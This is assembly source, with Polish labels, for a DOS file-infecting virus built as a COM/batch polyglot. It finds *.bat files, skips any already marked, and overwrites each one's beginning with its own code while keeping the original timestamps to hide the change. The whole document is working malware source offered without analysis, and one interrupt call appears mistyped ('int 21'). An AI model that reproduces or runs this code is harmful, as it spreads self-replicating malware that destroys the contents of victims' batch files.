format binary

P21H_PLIK_SZUKAJ_MASKA equ 4eh
P21H_PLIK_SZUKAJ_NASTEPNEGO equ 4fh
P21H_PLIK_NAZWA_OFFSET equ 9eh
P21H_PLIK_OTWORZ equ 3d02h
P21H_PLIK_ODCZYTAJ equ 3fh
P21H_PLIK_ZAPISZ equ 40h
P21H_PLIK_ZAMKNIJ equ 3eh
P21H_PLIK_WSKAZNIK_PRZESUN equ 4200h
P21H_PLIK_WSKAZNIK_POCZATEK equ 00h
P21H_P_DATA_CZAS_POBIERZ equ 5700h
P21H_P_DATA_CZAS_ZAPISZ equ 5701h
P21H_ZAMKNIJ equ 4c00h

PLIK_POCZATEK_ADRES equ 100h

org 100h

start:
  db ': '
  jmp plik_zarazenie
  db 13, 10, '@echo off'
  db 13, 10, 'copy %0 ABCD.COM > NUL'
  db 13, 10, 'ABCD.COM'
  db 13, 10, 'del ABCD.COM > NUL'
  db 13, 10, 'goto x'
  db 13, 10
plik_zarazenie:
  mov ah, P21H_PLIK_SZUKAJ_MASKA
  xor cx, cx
  mov dx, plik_maska
plik_szukaj:
  int 21h
  jc plik_zarazenie_koniec
  mov ax, P21H_PLIK_OTWORZ
  mov dx, P21H_PLIK_NAZWA_OFFSET
  int 21h
  xchg bx, ax
  mov ah, P21H_PLIK_ODCZYTAJ
  mov cx, 2h
  mov dx, bufor
  int 21h
  cmp word [bufor], 203Ah
  je plik_zarazenie_nastepny
  xor dx, dx
  mov cx, dx
  mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_POCZATEK)
  int 21h
  mov ax, P21H_P_DATA_CZAS_POBIERZ
  int 21h
  push cx
  push dx
  mov ah, P21H_PLIK_ZAPISZ
  mov cx, koniec - PLIK_POCZATEK_ADRES
  mov dx, PLIK_POCZATEK_ADRES
  int 21h
  pop dx
  pop cx
  mov ax, P21H_P_DATA_CZAS_ZAPISZ
  int 21
plik_zarazenie_nastepny:
  mov ah, P21H_PLIK_ZAMKNIJ
  int 21h
  mov ah, P21H_PLIK_SZUKAJ_NASTEPNEGO
  jmp plik_szukaj
plik_zarazenie_koniec:
  mov ax, P21H_ZAMKNIJ
  int 21h
  
bufor dw 0
plik_maska db '*.bat', 0h
  db 13, 10, ':x'
koniec:
